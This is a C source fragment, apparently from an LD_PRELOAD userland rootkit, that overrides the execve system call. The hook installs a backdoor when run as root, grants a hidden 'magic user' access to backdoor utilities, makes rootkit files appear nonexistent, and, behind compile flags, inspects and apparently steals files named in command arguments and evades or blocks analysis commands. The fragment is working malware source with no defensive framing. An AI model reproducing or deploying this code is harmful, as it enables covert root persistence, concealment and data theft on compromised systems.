int execve(const char *filename, char *const argv[], char *const envp[]){
    if(getuid() == 0 && rknomore() &&
                                    #ifdef PATCH_DYNAMIC_LINKER
                                    !preloadok(PRELOAD_FILE)
                                    #else
                                    !preloadok(OLD_PRELOAD)
                                    #endif
                                    && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
        bdvinstall(argv);

    plsdomefirst();

    hook(CEXECVE);

    if(magicusr()){
#ifdef BACKDOOR_ROLF
        if(!fnmatch("*/bdvrolf", argv[0], FNM_PATHNAME))
            dorolfpls();
#endif
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            dobdvutil(argv);
#endif
        return (long)call(CEXECVE, filename, argv, envp);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#ifdef FILE_STEAL
    for(int i = 1; argv[i] != NULL; i++)
        inspect_file(argv[i]);
#endif

#ifdef DO_EVASIONS
    int evasion_status = evade(filename, argv, envp);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVE, filename, argv, envp);
        case VNOTHING_DONE:
            break;  /* ?? */
    }

    if(block_strings(filename, argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVE, filename, argv, envp);
}
